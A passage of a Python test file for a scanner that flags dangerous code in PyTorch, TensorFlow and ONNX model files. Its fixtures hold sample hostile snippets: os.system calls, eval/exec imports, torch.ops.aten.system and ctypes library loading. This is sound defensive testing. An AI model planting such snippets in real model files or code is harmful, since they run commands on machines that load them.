            b"        def __init__(self, name: str) -> None:\n"
            b"            self.init = lambda name: None\n"
            b"            self.init(name)\n"
            b"    ctypes.LibraryLoader(SafeShadowCDLL).payload\n"
            b"    SafeShadowCDLL('/missing')\n"
            b"    class SafeNewCDLL(ctypes.CDLL):\n"
            b"        def __new__(cls, name: str):\n"
            b"            return object()\n"
            b"    ctypes.LibraryLoader(SafeNewCDLL).payload\n"
            b"    SafeNewCDLL('/missing')\n"
            b"    setattr(ctypes.windll, 'kernel32', len)\n"
            b"    ctypes.windll.kernel32\n"
            b"    safe_loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    setattr(safe_loader, 'payload', len)\n"
            b"    safe_loader.payload([])\n"
            b"    safe_browser = webbrowser.get()\n"
            b"    setattr(safe_browser, 'open', len)\n"
            b"    safe_browser.open([])\n"
            b"    return load.__name__\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern"
            and finding.pattern in {"Web browser launch detected", "Native library loading detected"}
            for finding in findings
        )

    def test_strict_mode(self) -> None:
        """Test strict mode flags any JIT usage."""
        detector_normal = JITScriptDetector({"strict_mode": False})
        detector_strict = JITScriptDetector({"strict_mode": True})

        data = b"TorchScript torch.jit.script"

        findings_normal = detector_normal.scan_torchscript(data)
        findings_strict = detector_strict.scan_torchscript(data)

        assert not any(f.type == "jit_usage" for f in findings_normal)
        # Strict mode should flag JIT usage
        assert any(f.type == "jit_usage" for f in findings_strict)
        # Normal mode might not flag it as severely
        strict_warnings = [f for f in findings_strict if f.type == "jit_usage"]
        assert len(strict_warnings) > 0

    def test_custom_dangerous_ops(self):
        """Test adding custom dangerous operations."""
        config = {
            "custom_dangerous_ops": {
                "torch": ["my.custom.dangerous.op"],
                "tf": ["tf.my.dangerous.function"],
            }
        }
        detector = JITScriptDetector(config)

        # Test custom Torch op
        torch_data = b"my.custom.dangerous.op(payload)"
        findings = detector.scan_torchscript(torch_data)
        assert any("my.custom.dangerous.op" in getattr(f, "operation", "") for f in findings)

        # Test custom TF op
        tf_data = b"tf.my.dangerous.function(exploit)"
        findings = detector.scan_tensorflow(tf_data)
        assert any("tf.my.dangerous.function" in getattr(f, "operation", "") for f in findings)

    def test_ast_analysis(self):
        """Test Python AST analysis for dangerous patterns."""
        detector = JITScriptDetector()

        # Valid Python code with dangerous patterns
        python_code = b"""
def malicious():
    import os
    from subprocess import call

    eval('dangerous')
    exec(compile('code', 'string', 'exec'))
    __import__('sys').exit()
"""

        findings = detector._extract_and_check_python_code(python_code, "Test", "test")

        # Should detect through AST analysis
        ast_findings = [f for f in findings if "ast_" in getattr(f, "type", "")]
        assert len(ast_findings) > 0
        assert any("os" in getattr(f, "import_", "") for f in ast_findings)


class TestDetectJITScriptRisks:
    """Test the convenience function for file scanning."""

    def test_scan_file(self, tmp_path):
        """Test scanning a file for JIT/Script risks."""
        # Create a test file with dangerous content
        test_file = tmp_path / "model.pt"
        test_file.write_bytes(b"TorchScript\ntorch.ops.aten.system('evil')")

        findings = detect_jit_script_risks(str(test_file))
        assert len(findings) > 0
        assert any("torch.ops.aten.system" in str(f) for f in findings)

    def test_scan_file_detects_unmarked_dangerous_python_source(self, tmp_path: Path) -> None:
        test_file = tmp_path / "payload.bin"
        test_file.write_bytes(
            b"""
            def payload():
                import os
                return os.system("id")
            """
        )

        findings = detect_jit_script_risks(str(test_file))

        assert any(f.type == "dangerous_import" and f.import_ == "os" for f in findings)

    def test_file_not_found(self):
        """Test handling of non-existent files."""
        findings = detect_jit_script_risks("/non/existent/file.pt")
        assert len(findings) == 1
        assert findings[0].type == "error"
        assert "not found" in findings[0].message

    def test_file_too_large(self, tmp_path):
        """Test handling of files that are too large."""
        large_file = tmp_path / "large.pt"
        large_file.write_bytes(b"x" * 100)

        # Test with very small max_size
        findings = detect_jit_script_risks(str(large_file), max_size=50)
        assert len(findings) == 1
        assert findings[0].type == "error"
        assert "too large" in findings[0].message

    def test_model_type_detection_from_extension(self, tmp_path):
        """Test that model type is detected from file extension."""
        # Test PyTorch extensions
        for ext in [".pt", ".pth", ".pts", ".torchscript"]:
            test_file = tmp_path / f"model{ext}"
            test_file.write_bytes(b"torch.ops.aten.exec('bad')")
            findings = detect_jit_script_risks(str(test_file))
            assert any("torch.ops.aten.exec" in str(f) for f in findings)

        # Test TensorFlow extensions
        for ext in [".pb", ".h5", ".keras"]:
            test_file = tmp_path / f"model{ext}"
            test_file.write_bytes(b"tf.py_func(evil)")
            findings = detect_jit_script_risks(str(test_file))
            assert any("tf.py_func" in str(f) for f in findings)

        # Test ONNX extension
        test_file = tmp_path / "model.onnx"
        test_file.write_bytes(b"PythonOp custom")
        findings = detect_jit_script_risks(str(test_file))
        assert any("Python operator" in str(f) for f in findings)


def test_priority_assignment_aliases_bounds_expensive_probes(monkeypatch: pytest.MonkeyPatch) -> None:
    # Each indirect-alias probe re-parses the whole snippet; without a bound this is
    # quadratic in the assignment count (PR #1402 DoS follow-up). The expensive
    # probes are capped while the cheap direct-reference fast path still resolves.
    lines = ["import ctypes", *[f"v{index} = index + {index}" for index in range(400)], "alias = ctypes"]
    source = "\n".join(lines)
    tree = ast.parse(source)

    parse_calls = 0
    real_parse = ast.parse

    def counting_parse(*args: Any, **kwargs: Any) -> Any:
        nonlocal parse_calls
        parse_calls += 1
        return real_parse(*args, **kwargs)

    monkeypatch.setattr(jit_script_module.ast, "parse", counting_parse)
    aliases = jit_script_module._priority_assignment_aliases(source, tree, {"ctypes"})

    assert parse_calls <= jit_script_module._MAX_PRIORITY_ASSIGNMENT_PROBES + 1
    # The direct-reference alias is still discovered via the cheap fast path.
    assert b"alias" in aliases


def test_first_body_statement_segment_bounds_nested_recursion() -> None:
    # A pathologically nested run of ``:`` headers must not exhaust the stack
    # (PR #1402 recursion follow-up); extraction returns a bounded segment instead.
    header = b"def f():\n"
    candidate = header + b"".join(b" " * (depth + 1) + b"if 1:\n" for depth in range(3000)) + b" " * 3001 + b"x = 1\n"
    segment = jit_script_module._first_body_statement_segment(candidate, len(header), 0)
    assert segment is not None
